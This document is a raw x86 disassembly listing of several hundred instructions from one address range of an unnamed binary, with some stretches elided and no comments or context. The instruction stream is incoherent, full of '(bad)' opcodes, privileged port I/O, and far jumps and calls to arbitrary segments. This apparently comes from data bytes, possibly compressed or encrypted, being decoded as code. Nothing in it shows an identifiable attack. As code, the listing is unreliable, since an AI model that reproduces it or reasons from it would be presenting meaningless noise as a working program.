  42a5ed:	dec    edx
  42a5ee:	jmp    0x42a63a
  42a5f0:	(bad)  
  42a5f2:	nop
  42a5f3:	jle    0x42a578
  42a5f5:	retf   0x7551
  42a5f8:	mov    dl,0xdc
  42a5fa:	enter  0xc7df,0xbd
  42a5fe:	fisttp DWORD PTR [eax-0x4f]
  42a601:	push   ebp
  42a602:	repnz into 
  42a604:	ins    DWORD PTR es:[edi],dx
  42a605:	cld    
  42a606:	push   edx
  42a607:	or     al,0x3a
  42a609:	sub    BYTE PTR ss:[ecx+0x66288d96],dh
  42a610:	and    dl,BYTE PTR [ebx+0x59]
  42a613:	fimul  DWORD PTR [edx-0x6710286a]
  42a619:	lods   eax,DWORD PTR ds:[esi]
  42a61a:	pop    ebp
  42a61b:	dec    esi
  42a61c:	inc    esp
  42a61d:	lahf   
  42a61e:	dec    esp
  42a61f:	jp     0x42a5d9
  42a621:	jg     0x42a67b
  42a623:	lds    ebx,FWORD PTR [esi]
  42a625:	xchg   ebp,eax
  42a626:	ins    BYTE PTR es:[edi],dx
  42a627:	jnp    0x42a5db
  42a629:	mov    dl,0xe8
  42a62b:	call   esi
  42a62d:	sahf   
  42a62e:	out    dx,eax
  42a62f:	test   DWORD PTR [edi],ebx
  42a631:	test   BYTE PTR ds:0x9846,al
	...
  42a693:	add    BYTE PTR [eax],al
  42a695:	add    BYTE PTR [esi+edx*1],ah
  42a698:	outs   dx,BYTE PTR ds:[esi]
  42a699:	(bad)  
  42a69a:	jle    0x42a69b
  42a69c:	lods   eax,DWORD PTR ds:[esi]
  42a69d:	test   DWORD PTR [edi],0x4b67323b
  42a6a3:	xor    edi,esp
  42a6a5:	xor    bh,BYTE PTR [ebp-0x3b]
  42a6a8:	add    DWORD PTR [eax],eax
  42a6aa:	pop    es
  42a6ab:	add    DWORD PTR [eax],eax
  42a6ad:	add    ch,dh
  42a6af:	and    bl,BYTE PTR [eax+0x3b]
  42a6b2:	rcl    BYTE PTR [ecx-0x3622581e],1
  42a6b8:	mov    ah,0x8c
  42a6ba:	call   0x197c:0xbd17056d
  42a6c1:	shl    DWORD PTR [eax],cl
  42a6c3:	fist   DWORD PTR ds:0x66f77f50
  42a6c9:	mov    ch,0xae
  42a6cb:	sub    edi,DWORD PTR [ebp+0x517d4f89]
  42a6d1:	mov    dl,dl
  42a6d3:	int    0x98
  42a6d5:	test   eax,0x2b77853e
  42a6da:	int    0x6d
  42a6dc:	cwde   
  42a6dd:	popa   
  42a6de:	mov    ah,0xe0
  42a6e0:	mov    ds:0x760f85e,al
  42a6e5:	popa   
  42a6e6:	pop    ebx
  42a6e7:	and    al,0x44
  42a6e9:	dec    esp
  42a6eb:	mov    esp,0xc0c6de13
  42a6f0:	shl    bl,0x53
  42a6f3:	lock mov al,ds:0x6e81c279
  42a6f9:	add    edx,edx
  42a6fb:	inc    ebp
  42a6fc:	ret    0x9f57
  42a6ff:	in     al,0x55
  42a701:	imul   ecx,DWORD PTR [ecx+eax*2+0x70],0xffffffe7
  42a706:	push   0xffffffb3
  42a708:	(bad)  
  42a709:	jmp    0x17a9:0xe1bb85c9
  42a710:	jecxz  0x42a768
  42a712:	adc    eax,0x4b2ddd14
  42a717:	rcr    DWORD PTR [eax],cl
  42a719:	inc    esi
  42a71a:	inc    esp
  42a71b:	or     DWORD PTR [edx+0x3bf0cd0f],ebp
  42a721:	lods   al,BYTE PTR ds:[esi]
  42a722:	inc    esi
  42a723:	or     DWORD PTR [edi-0x2a],ebp
  42a726:	mov    al,ds:0x46a8c124
  42a72b:	mov    WORD PTR [ebx-0x14043c3e],ss
  42a731:	dec    esi
  42a732:	scas   al,BYTE PTR es:[edi]
  42a733:	(bad)  
  42a734:	pop    ebp
  42a735:	fbld   TBYTE PTR [ecx+0x33]
  42a738:	and    eax,0xee472ebd
  42a73d:	int3   
  42a73e:	cmp    DWORD PTR [ebx+0x79e3a823],ebx
  42a744:	adc    ch,BYTE PTR [edx+0x4b]
  42a747:	imul   edi,DWORD PTR [ecx],0x58cf81d9
  42a74d:	or     dh,BYTE PTR [edi+eiz*2-0x50]
  42a751:	lea    edx,[ebx]
  42a753:	(bad)  
  42a754:	stos   BYTE PTR es:[edi],al
  42a755:	rsqrtps xmm0,XMMWORD PTR [ebp+0x2b]
  42a759:	pop    ds
  42a75a:	mov    gs,WORD PTR [ebx]
  42a75c:	ret    0xc7de
  42a75f:	leave  
  42a760:	fdivr  st(4),st
  42a762:	fwait
  42a763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a764:	call   0x28b7:0x1e0a3ad2
  42a76b:	and    DWORD PTR [ebp+ebx*4+0x308ee0ba],ecx
  42a772:	sub    DWORD PTR [ecx],eax
  42a774:	jmp    FWORD PTR [ebx-0x7b0b4ae2]
  42a77a:	pop    esp
  42a77b:	fisubr WORD PTR [edi-0x31]
  42a77e:	daa    
  42a77f:	add    DWORD PTR [edi],ebp
  42a781:	jl     0x42a728
  42a783:	cmp    DWORD PTR [esp-0x38],0x4e
  42a788:	dec    ecx
  42a789:	push   edx
  42a78a:	adc    DWORD PTR [edx+0x127f2473],0x69
  42a791:	stos   BYTE PTR es:[edi],al
  42a792:	jns    0x42a7df
  42a794:	pop    edx
  42a795:	xchg   DWORD PTR [eax+0x7190adf2],eax
  42a79b:	(bad)  
  42a79c:	sti    
  42a79d:	add    eax,ecx
  42a79f:	mov    DWORD PTR [eax+0x5a8785e],esp
  42a7a5:	or     dl,BYTE PTR [edi]
  42a7a7:	push   0xfffffff7
  42a7a9:	push   cs
  42a7aa:	mov    WORD PTR [ebp+0x5fed4361],gs
  42a7b0:	outs   dx,DWORD PTR ds:[esi]
  42a7b1:	xor    esp,edx
  42a7b3:	push   ss
  42a7b4:	fild   DWORD PTR [eax]
	...
  42a816:	mov    ah,BYTE PTR [ebp+0x63]
  42a819:	mov    edi,0x75debfef
  42a81e:	jp     0x42a869
  42a820:	arpl   WORD PTR [ebx],sp
  42a822:	iret   
  42a823:	xchg   ebx,eax
  42a824:	mov    bh,0x7c
  42a826:	test   dh,al
  42a828:	add    DWORD PTR [eax],eax
  42a82a:	pop    es
  42a82b:	add    DWORD PTR [eax],eax
  42a82d:	add    BYTE PTR [ecx+0x3],al
  42a830:	jno    0x42a8aa
  42a832:	push   0x6e
  42a834:	adc    bl,bh
  42a836:	xor    eax,0xc61fc9c2
  42a83b:	push   ebx
  42a83c:	pop    ebp
  42a83d:	xlat   BYTE PTR ds:[ebx]
  42a83e:	fidiv  WORD PTR [ecx+0x66]
  42a841:	cs mov ch,0x91
  42a844:	mov    dl,0x57
  42a846:	jno    0x42a881
  42a848:	sub    ebx,DWORD PTR [ecx+0x5a71cc5a]
  42a84e:	outs   dx,BYTE PTR ds:[esi]
  42a84f:	or     edi,DWORD PTR [edx+edx*1]
  42a852:	jns    0x42a87d
  42a854:	and    bl,dl
  42a856:	cmp    DWORD PTR [ecx-0x18],ebp
  42a859:	and    edx,DWORD PTR [ebp+0x2d13cfa5]
  42a85f:	jmp    0x4922f160
  42a864:	fmul   DWORD PTR [edi-0x52f0df54]
  42a86a:	(bad)  
  42a86c:	fwait
  42a86d:	aaa    
  42a86e:	mov    ds:0xc5f8a473,eax
  42a873:	push   ds
  42a874:	je     0x42a86b
  42a876:	sub    al,0x2f
  42a878:	cmp    DWORD PTR [ebp+0x38],edx
  42a87b:	dec    esp
  42a87c:	jg     0x42a8b4
  42a87e:	popa   
  42a87f:	data16 sbb dh,BYTE PTR [ebp+0x1]
  42a883:	rcr    DWORD PTR [eax],0x6
  42a886:	inc    esi
  42a887:	ja     0x42a859
  42a889:	das    
  42a88a:	daa    
  42a88b:	sub    dh,al
  42a88d:	sbb    al,dl
  42a88f:	mov    BYTE PTR [edx-0x6c544671],ch
  42a895:	xchg   DWORD PTR [edx],ebp
  42a897:	mov    esp,DWORD PTR [edi+esi*8]
  42a89a:	lock jns 0x42a871
  42a89d:	ret    
  42a89e:	jb     0x42a87e
  42a8a0:	jae    0x42a830
  42a8a2:	cmp    eax,0xef31d448
  42a8a7:	fs scas al,BYTE PTR es:[edi]
  42a8a9:	jb     0x42a88b
  42a8ab:	addr16 into 
  42a8ad:	sti    
  42a8ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a8af:	test   eax,0x7bc33675
  42a8b4:	scas   al,BYTE PTR es:[edi]
  42a8b5:	icebp  
  42a8b6:	mov    al,ds:0x605a921d
  42a8bb:	pop    ss
  42a8bc:	test   eax,0xba87d1f6
  42a8c1:	inc    esp
  42a8c2:	pop    ss
  42a8c3:	fcom   QWORD PTR [ecx]
  42a8c5:	inc    esp
  42a8c6:	sbb    BYTE PTR [ebp-0x4734cefb],dl
  42a8cc:	sub    DWORD PTR [edx-0x5056312b],0xffffffef
  42a8d3:	idiv   DWORD PTR [edi-0x25]
  42a8d6:	imul   ebp,edx,0x40b835c
  42a8dc:	loopne 0x42a8af
  42a8de:	shl    ch,1
  42a8e0:	call   0xaea09091
  42a8e5:	rcl    edx,1
  42a8e7:	cld    
  42a8e8:	sbb    esi,eax
  42a8ea:	mov    bh,0x17
  42a8ec:	fbld   TBYTE PTR [ebx]
  42a8ee:	out    dx,eax
  42a8ef:	xlat   BYTE PTR ds:[ebx]
  42a8f0:	push   ss
  42a8f1:	sbb    ecx,DWORD PTR [esi-0x3c]
  42a8f4:	mov    esi,0xd30f7662
  42a8f9:	dec    ebx
  42a8fa:	popa   
  42a8fb:	mov    es,WORD PTR [eax+0x2b97bba3]
  42a901:	(bad)  
  42a902:	mov    esi,0xb9523538
  42a907:	lock rcr BYTE PTR [ecx+0x70],1
  42a90b:	aad    0x9c
  42a90d:	fisttp WORD PTR [ecx]
  42a90f:	fdiv   DWORD PTR [ecx+ebx*4]
  42a912:	xchg   ebx,eax
  42a913:	push   0xfffffff2
  42a915:	adc    ebp,DWORD PTR [esi]
  42a917:	xor    BYTE PTR [ecx],0xa6
  42a91a:	cli    
  42a91b:	jne    0x42a979
  42a91d:	add    esi,DWORD PTR [ecx-0x64d32632]
  42a923:	(bad)  
  42a924:	push   eax
  42a925:	out    dx,al
  42a926:	ins    DWORD PTR es:[edi],dx
  42a927:	push   ebx
  42a928:	loop   0x42a916
  42a92a:	inc    esp
  42a92b:	mov    ch,0x45
  42a92d:	jmp    0x7e47:0x64797ae4
  42a934:	dec    edx
	...
  42a995:	add    BYTE PTR [eax+0x3fee1d93],ch
  42a99b:	out    dx,al
  42a99c:	sti    
  42a99d:	xlat   BYTE PTR ds:[ebx]
  42a99e:	push   esi
  42a99f:	aam    0xbc
  42a9a1:	or     ebp,eax
  42a9a3:	sub    al,0x9e
  42a9a5:	test   BYTE PTR [ebx+0x70001c7],0x1
  42a9ac:	add    BYTE PTR [eax],al
  42a9ae:	xor    ebp,DWORD PTR [ebx+0x31]
  42a9b1:	push   es
  42a9b2:	cmp    al,0x36
  42a9b4:	add    esi,DWORD PTR [eax+0x48b0d0b5]
  42a9ba:	jg     0x42aa1c
  42a9bc:	jecxz  0x42a9be
  42a9be:	add    edx,esi
  42a9c0:	adc    DWORD PTR [ebx+ebp*4-0x139d7784],ebp
  42a9c7:	test   bl,cl
  42a9c9:	inc    esp
  42a9ca:	mov    edx,0x6f742deb
  42a9cf:	jl     0x42aa4b
  42a9d1:	sub    al,0x4d
  42a9d3:	fwait
  42a9d4:	test   BYTE PTR [ebx-0x1e],ch
  42a9d7:	aad    0xb3
  42a9d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a9da:	dec    ebp
  42a9db:	pop    esp
  42a9dc:	clc    
  42a9dd:	inc    ebp
  42a9de:	pop    esi
  42a9df:	inc    edi
  42a9e0:	add    bl,BYTE PTR [ebx-0x78]
  42a9e3:	xor    DWORD PTR [esi+0x77],ebp
  42a9e6:	pop    edi
  42a9e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a9e8:	test   BYTE PTR [esi+ebx*2+0x1b],ah
  42a9ec:	jge    0x42a972
  42a9ee:	mov    dl,0x1
  42a9f0:	inc    ebp
  42a9f1:	test   eax,0x89d2f79f
  42a9f6:	mov    al,ds:0x5dbe90df
  42a9fb:	jge    0x42a9bd
  42a9fd:	imul   edx,ebp,0x78
  42aa00:	icebp  
  42aa01:	inc    esi
  42aa02:	sti    
  42aa03:	or     edi,DWORD PTR [ebp-0x72ecc08a]
  42aa09:	arpl   WORD PTR [ebp+edx*1+0xd71d21f],di
  42aa10:	sbb    al,0x26
  42aa12:	add    dh,BYTE PTR [ecx]
  42aa14:	and    edi,edi
  42aa16:	sbb    ch,cl
  42aa18:	sub    eax,ecx
  42aa1a:	mov    dh,0x67
  42aa1c:	out    dx,eax
  42aa1d:	nop    DWORD PTR [edx-0x68]
  42aa21:	xchg   ebp,eax
  42aa22:	bound  ebp,QWORD PTR [ebp+0x73]
  42aa25:	(bad)  
  42aa26:	test   DWORD PTR [eax-0x2c9da210],0x816262e0
  42aa30:	loop   0x42aa2d
  42aa32:	sub    DWORD PTR [ebp+0x79],0xffffff9d
  42aa36:	lea    ecx,[ecx]
  42aa38:	sti    
  42aa39:	sub    esi,ebx
  42aa3b:	cs cdq 
  42aa3d:	ret    
  42aa3e:	xor    cl,BYTE PTR [ebp-0x1f]
  42aa41:	dec    edx
  42aa42:	fisub  DWORD PTR [eax-0x5]
  42aa45:	jmp    0x42aa25
  42aa47:	out    0xc1,al
  42aa49:	mov    edx,esp
  42aa4b:	lds    ebp,FWORD PTR [eax-0x34917efb]
  42aa51:	lods   eax,DWORD PTR ds:[esi]
  42aa52:	(bad)  
  42aa53:	jns    0x42aa05
  42aa55:	jnp    0x42aa4a
  42aa57:	jo     0x42aa07
  42aa59:	scas   al,BYTE PTR es:[edi]
  42aa5a:	jmp    0x42aa1d
  42aa5c:	pop    ebx
  42aa5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42aa5e:	dec    ecx
  42aa5f:	xor    ebp,DWORD PTR [eax-0x5d03c32f]
  42aa65:	dec    esi
  42aa66:	in     eax,0xff
  42aa68:	in     al,0xcf
  42aa6a:	push   cs
  42aa6b:	or     eax,0x7f5fc480
  42aa70:	int3   
  42aa71:	std    
  42aa72:	retf   
  42aa73:	xchg   ecx,eax
  42aa74:	or     BYTE PTR [esi-0x80],dl
  42aa77:	jnp    0x42aad7
  42aa79:	sbb    BYTE PTR [edi+eiz*1-0x7c],bl
  42aa7d:	dec    ebx
  42aa7e:	pop    ds
  42aa7f:	ja     0x42aa43
  42aa81:	push   edx
  42aa82:	jmp    0xa8a8:0x85b39cd1
  42aa89:	pusha  
  42aa8a:	lods   eax,DWORD PTR ds:[esi]
  42aa8b:	and    ch,dl
  42aa8d:	cli    
  42aa8e:	cmp    dl,cl
  42aa90:	sbb    eax,0xbc321078
  42aa95:	out    0x78,eax
  42aa97:	jns    0x42aa6f
  42aa99:	data16 add al,0x9f
  42aa9c:	iret   
  42aa9d:	(bad)  
  42aa9e:	dec    ecx
  42aa9f:	fild   DWORD PTR [edx+eax*4-0x128f324d]
  42aaa6:	daa    
  42aaa7:	add    bh,ah
  42aaa9:	jle    0x42aa62
  42aaab:	push   es
  42aaac:	push   esp
  42aaad:	sub    DWORD PTR [edi+eax*8-0x26d46e4b],ebp
  42aab4:	test   BYTE PTR [eax],0x0
	...
  42ab13:	add    BYTE PTR [eax],al
  42ab15:	add    BYTE PTR [esi],bh
  42ab17:	push   cs
  42ab18:	sub    al,0x5d
  42ab1a:	cmp    al,0x7f
  42ab1c:	jg     0x42ab8d
  42ab1e:	dec    eax
  42ab1f:	das    
  42ab20:	pop    edi
  42ab21:	mov    DWORD PTR [esi-0x6db220d0],ebp
  42ab27:	enter  0x1,0x7
  42ab2b:	add    DWORD PTR [eax],eax
  42ab2d:	add    BYTE PTR [esi-0x43],bh
  42ab30:	xor    eax,0x1d241848
  42ab35:	je     0x42aac2
  42ab37:	mov    WORD PTR [esi-0x71d3983a],gs
  42ab3d:	inc    ecx
  42ab3e:	mov    dl,0xfc
  42ab40:	loopne 0x42ab6a
  42ab42:	jbe    0x42ab33
  42ab44:	ret    0xd0e6
  42ab47:	adc    bl,BYTE PTR cs:[ebx+0x75]
  42ab4b:	je     0x42ab70
  42ab4d:	or     DWORD PTR [edx+0x48332ce6],ecx
  42ab53:	lea    edi,[edx]
  42ab55:	ss clc 
  42ab57:	push   eax
  42ab58:	out    0x15,al
  42ab5a:	cmp    al,dl
  42ab5c:	inc    eax
  42ab5d:	ret    0x5692
  42ab60:	jnp    0x42ab3a
  42ab62:	in     eax,0x33
  42ab64:	hlt    
  42ab65:	push   es
  42ab66:	push   edi
  42ab67:	mov    al,ds:0xf781824e
  42ab6c:	mov    DWORD PTR [esp+ebp*4],ecx
  42ab6f:	mov    esp,0xd737f55f
  42ab74:	cli    
  42ab75:	mov    al,dl
  42ab77:	mov    dh,0x82
  42ab79:	(bad)  
  42ab7a:	in     al,0x5b
  42ab7c:	stos   DWORD PTR es:[edi],eax
  42ab7d:	es enter 0xb772,0xc1
  42ab82:	inc    ebp
  42ab83:	mov    eax,ds:0xde43ad45
  42ab88:	test   al,0x7b
  42ab8a:	pop    ecx
  42ab8b:	(bad)  
  42ab8c:	mov    BYTE PTR [esi+0x2cb4c9dc],cl
  42ab92:	ins    DWORD PTR es:[edi],dx
  42ab93:	loopne 0x42ab6d
  42ab95:	xchg   esi,eax
  42ab96:	mov    dl,BYTE PTR [ebx+0x70]
  42ab99:	pop    edx
  42ab9a:	in     al,dx
  42ab9b:	cmp    al,BYTE PTR [edi]
  42ab9d:	mov    ebx,es
  42ab9f:	popf   
  42aba0:	mov    dl,0x97
  42aba2:	inc    edx
  42aba3:	pushf  
  42aba4:	jp     0x42abe7
  42aba6:	addr16 test bh,dh
  42aba9:	mov    WORD PTR ds:0x905f4bf2,?
  42abaf:	add    esp,DWORD PTR [eax-0x2f81050b]
  42abb5:	cmp    ah,dl
  42abb7:	cs stos WORD PTR es:[edi],ax
  42abba:	mov    esi,0xdda16c2b
  42abbf:	enter  0x2176,0xf1
  42abc3:	aad    0x21
  42abc5:	dec    ecx
  42abc6:	jmp    0x8e4aa546
  42abcb:	jmp    0xbb9dd8dc
  42abd0:	ret    0x1796
  42abd3:	in     eax,0x54
  42abd5:	sbb    al,0xb5
  42abd7:	call   0x70b8:0xca3b6dff
  42abde:	repz mov bl,0x8b
  42abe1:	out    dx,al
  42abe2:	and    ch,BYTE PTR [edi]
  42abe4:	or     al,0xd8
  42abe6:	mov    al,ds:0x32f56a58
  42abeb:	mov    eax,ds:0xf5a4ecc0
  42abf0:	fwait
  42abf1:	adc    DWORD PTR [eax],edx
  42abf3:	xchg   ebp,eax
  42abf4:	xchg   edi,eax
  42abf5:	cmp    eax,0xebd122da
  42abfa:	xor    eax,DWORD PTR [ebx]
  42abfc:	dec    edx
  42abfd:	inc    edi
  42abfe:	push   cs
  42abff:	adc    ch,bh
  42ac01:	mov    ds:0xf3c36b63,eax
  42ac06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ac07:	aas    
  42ac08:	pop    edx
  42ac09:	add    DWORD PTR [edx-0x27],ebp
  42ac0c:	xor    al,BYTE PTR [esi*4-0x5ffc672c]
  42ac13:	out    0xa8,eax
  42ac15:	mov    ch,0xc7
  42ac17:	out    0x29,al
  42ac19:	(bad)
  42ac1d:	cwde   
  42ac1e:	into   
  42ac1f:	jle    0x42ac02
  42ac21:	retf   0xda4f
  42ac24:	jecxz  0x42ac5a
  42ac26:	or     DWORD PTR [ecx+0x148d7bf5],ebx
  42ac2c:	jo     0x42ac01
  42ac2e:	jecxz  0x42ac45
  42ac30:	nop
  42ac31:	pop    es
  42ac32:	fs add al,0x28
	...
  42ac95:	add    cl,ch
  42ac97:	xor    bl,BYTE PTR [edx+edi*1]
  42ac9a:	fistp  QWORD PTR [esi]
  42ac9c:	out    dx,eax
  42ac9d:	repz rcl BYTE PTR [edi-0x6ce9f5a7],cl
  42aca4:	cmp    eax,0x1c9998d
  42aca9:	add    BYTE PTR [edi],al
  42acab:	add    DWORD PTR [eax],eax
  42acad:	add    BYTE PTR [eax],dl
  42acaf:	daa    
  42acb0:	mov    edi,0x32820ca6
  42acb6:	outs   dx,DWORD PTR ds:[esi]
  42acb7:	shl    DWORD PTR [edi],0x8e
  42acba:	jecxz  0x42ad1e
  42acbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42acbd:	gs aas 
  42acbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42acc0:	outs   dx,DWORD PTR ds:[esi]
  42acc1:	pop    eax
  42acc2:	dec    eax
  42acc3:	mov    eax,DWORD PTR [eax-0x14f9c156]
  42acc9:	les    eax,FWORD PTR [eax-0x5ceb59b0]
  42accf:	loop   0x42ac75
  42acd1:	test   ebx,esp
  42acd3:	mov    edx,0xc4ea2e16
  42acd8:	sti    
  42acd9:	cmovle edi,edx
  42acdc:	std    
  42acdd:	push   edx
  42acde:	and    al,0xe2
  42ace0:	or     ch,cl
  42ace2:	aam    0x9d
  42ace4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ace5:	mov    ds:0x1118bff3,al
  42acea:	push   ecx
  42aceb:	icebp  
  42acec:	sbb    ch,BYTE PTR [ecx]
  42acee:	push   esp
  42acef:	outs   dx,BYTE PTR ds:[esi]
  42acf0:	aas    
  42acf1:	out    dx,eax
  42acf2:	hlt    
  42acf3:	out    0x6b,eax
  42acf5:	fistp  DWORD PTR [ebx-0x3ffb963c]
  42acfb:	or     bh,BYTE PTR [esi+0x6b]
  42acfe:	iret   
  42acff:	xor    al,0x13
  42ad01:	add    esi,DWORD PTR [ecx+ebp*1-0x49bc5a80]
  42ad08:	inc    esp
  42ad09:	fstp   DWORD PTR [ebx]
  42ad0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ad0c:	(bad)  
  42ad0d:	jns    0x42ad10
  42ad0f:	mov    cl,0xb2
  42ad11:	test   esp,esp
  42ad13:	retf   0x5581
  42ad16:	pushf  
  42ad17:	into   
  42ad18:	push   edx
  42ad19:	out    0x37,al
  42ad1b:	jecxz  0x42ad7b
  42ad1d:	imul   ebp,DWORD PTR [esi+0x31],0xfffffffc
  42ad21:	dec    ebx
  42ad22:	fist   WORD PTR [ecx]
  42ad24:	and    DWORD PTR [ebx],eax
  42ad26:	fimul  WORD PTR [edx]
  42ad28:	shl    DWORD PTR ds:0x21116055,0x65
  42ad2f:	mov    ch,0x38
  42ad31:	das    
  42ad32:	mov    DWORD PTR [ebx-0x7367dfa7],ebp
  42ad38:	xchg   edx,eax
  42ad39:	lods   al,BYTE PTR ds:[esi]
  42ad3a:	push   esp
  42ad3b:	imul   ebx,edx,0x71
  42ad3e:	test   BYTE PTR [edx-0x3bd363ec],cl
  42ad44:	fmul   QWORD PTR [ebx+0x1aecb8d8]
  42ad4a:	retf   0xb9d5
  42ad4d:	adc    ecx,ebx
  42ad4f:	sbb    DWORD PTR [ebp-0x41ae300],ebx
  42ad55:	pop    esp
  42ad56:	test   eax,0x45a4869a
  42ad5b:	sbb    eax,0xe80eb57b
  42ad60:	jb     0x42acfd
  42ad62:	int3   
  42ad63:	les    edx,FWORD PTR [ecx-0x6b909fa9]
  42ad69:	push   ss
  42ad6a:	or     al,0xf9
  42ad6c:	iret   
  42ad6d:	mov    edi,0x968b1297
  42ad72:	rcr    BYTE PTR [eax-0x66],cl
  42ad75:	sbb    eax,eax
  42ad77:	outs   dx,BYTE PTR ds:[esi]
  42ad78:	add    dl,BYTE PTR ds:0x51326dc
  42ad7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad7f:	mov    esp,0x26ed24b7
  42ad84:	enter  0xdacf,0xf1
  42ad88:	shl    BYTE PTR [esi-0x24303d65],1
  42ad8e:	sbb    ch,BYTE PTR [edi-0x47]
  42ad91:	out    0x15,eax
  42ad93:	sbb    BYTE PTR [esi+0xb],dh
  42ad96:	call   0x4046eb73
  42ad9b:	add    bl,BYTE PTR [esi]
  42ad9d:	outs   dx,BYTE PTR ds:[esi]
  42ad9e:	imul   esi,DWORD PTR [ebx],0x469f4f79
  42ada4:	xchg   ecx,eax
  42ada5:	mov    ds:0xb9d6a9a3,al
  42adaa:	pop    esp
  42adab:	jecxz  0x42ad4f
  42adad:	pop    ds
  42adae:	pop    esi
  42adaf:	push   ss
  42adb0:	sub    esi,DWORD PTR [edi]
  42adb2:	scas   al,BYTE PTR es:[edi]
  42adb3:	cmc    
  42adb4:	push   ebx
	...
  42ae15:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42ae1b:	mov    edi,0xe6d5f7ff
  42ae20:	and    ebp,DWORD PTR [eax+edx*1-0x5fb80d89]
  42ae27:	retf   0x1
  42ae2a:	pop    es
  42ae2b:	add    DWORD PTR [eax],eax
  42ae2d:	add    BYTE PTR [edi+edi*4+0x3af8edb0],al
  42ae34:	test   DWORD PTR [eax],edx
  42ae36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ae37:	mov    eax,0x41a32c2e
  42ae3c:	push   ecx
  42ae3d:	cmc    
  42ae3e:	sbb    DWORD PTR [eax],esp
  42ae40:	adc    edi,ecx
  42ae42:	outs   dx,DWORD PTR ds:[esi]
  42ae43:	je     0x42ae66
  42ae45:	dec    ecx
  42ae46:	adc    al,0xcd
  42ae48:	and    edx,esi
  42ae4a:	sub    ebx,DWORD PTR [eax]
  42ae4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ae4d:	adc    eax,0x89c1d95c
  42ae52:	repnz shl BYTE PTR [esi+0x2],1
  42ae56:	jb     0x42aecc
  42ae58:	adc    eax,0x505a9818
  42ae5d:	or     DWORD PTR [ebp-0x2],ecx
  42ae60:	push   ss
  42ae61:	sbb    al,0xdb
  42ae63:	mov    esp,0x67038a44
  42ae68:	pusha  
  42ae69:	outs   dx,BYTE PTR ds:[esi]
  42ae6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ae6b:	inc    ebx
  42ae6c:	ins    BYTE PTR es:[edi],dx
  42ae6d:	push   eax
  42ae6e:	dec    ebx
  42ae6f:	push   ecx
  42ae70:	outs   dx,BYTE PTR ds:[esi]
  42ae71:	out    0x56,eax
  42ae73:	loop   0x42aeea
  42ae75:	jle    0x42ae23
  42ae77:	dec    esp
  42ae78:	mov    ecx,0x9e517da7
  42ae7d:	imul   edx,DWORD PTR ds:0x97102470,0x67d37ba3
  42ae87:	dec    esi
  42ae88:	pop    esi
  42ae89:	ret    
  42ae8a:	test   eax,0xf5825cb6
  42ae8f:	int    0x3a
  42ae91:	mov    ds:0xe393fd09,al
  42ae96:	ror    BYTE PTR [esi+ebx*1+0x11],cl
  42ae9a:	mov    al,0x0
  42ae9c:	loopne 0x42ae57
  42ae9e:	jge    0x42aeae
  42aea0:	ret    0x7653
  42aea3:	imul   ecx,DWORD PTR ds:0xc1648575,0x8b720847
  42aead:	fld    DWORD PTR [esi-0x30f153e]
  42aeb3:	loope  0x42af1d
  42aeb5:	ret    
  42aeb6:	sub    BYTE PTR [ecx+0x28],cl
  42aeb9:	dec    esi
  42aeba:	in     al,0xb1
  42aebc:	lds    esp,FWORD PTR [ecx+0x7f372f50]
  42aec2:	(bad)  
  42aec3:	adc    ecx,DWORD PTR [ebx+0x21]
  42aec6:	sub    eax,0x879b72cd
  42aecb:	xor    ecx,ecx
  42aecd:	xor    esi,DWORD PTR [ebp+0x3cda5d80]
  42aed3:	adc    ecx,ecx
  42aed5:	fcmovbe st,st(0)
  42aed7:	inc    edx
  42aed8:	sub    eax,0x85a5f5bb
  42aedd:	out    0x4a,eax
  42aedf:	cmp    eax,0x74b169a6
  42aee4:	sub    eax,0x806ba74b
  42aee9:	and    ecx,DWORD PTR [esi]
  42aeeb:	push   0xbd910333
  42aef0:	mov    ebx,0xdf14b88
  42aef5:	dec    ebp
  42aef6:	pop    ds
  42aef7:	ret    0xe25
  42aefa:	mov    bl,0xb9
  42aefc:	jg     0x42af76
  42aefe:	push   esp
  42aeff:	inc    edx
  42af00:	bnd ja 0x42aeaf
  42af03:	call   0xc7f6:0x54e2c74
  42af0a:	lea    edi,[esi+0x53a80043]
  42af10:	add    al,0xf2
  42af12:	or     al,0x97
  42af14:	mov    edx,0x29a49ece
  42af19:	mov    ebp,0xc2b01d2a
  42af1e:	in     eax,0x45
  42af20:	push   cs
  42af21:	push   edi
  42af22:	dec    edi
  42af23:	rcl    BYTE PTR [ecx],1
  42af25:	ror    BYTE PTR [esi+0x50c6b8be],0x16
  42af2c:	loopne 0x42aee6
  42af2e:	sub    eax,0xcb39d6f6
  42af33:	pop    ebx
  42af34:	int3   
	...
  42af95:	add    cl,bh
  42af97:	enter  0xdc7a,0x7b
  42af9b:	(bad)  
  42af9c:	(bad)  
  42af9d:	in     eax,dx
  42af9e:	(bad)  
  42af9f:	adc    DWORD PTR [ebp+0x1a8fb2ea],0x4f
  42afa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42afa7:	retf   
  42afa8:	add    DWORD PTR [eax],eax
  42afaa:	pop    es
  42afab:	add    DWORD PTR [eax],eax
  42afad:	add    BYTE PTR [ecx],bl
  42afaf:	test   DWORD PTR ds:0x2d04c52e,0x60dd1ecc
  42afb9:	mov    dl,BYTE PTR [eax+0x76]
  42afbc:	lods   al,BYTE PTR ds:[esi]
  42afbd:	add    DWORD PTR [edx],ecx
  42afbf:	fs retf 
  42afc1:	in     al,0x7a
  42afc3:	xor    cl,BYTE PTR [edi+0x3895ff90]
  42afc9:	clc    
  42afca:	xlat   BYTE PTR ds:[ebx]
  42afcb:	test   BYTE PTR [esi+0x36],ch
  42afce:	nop
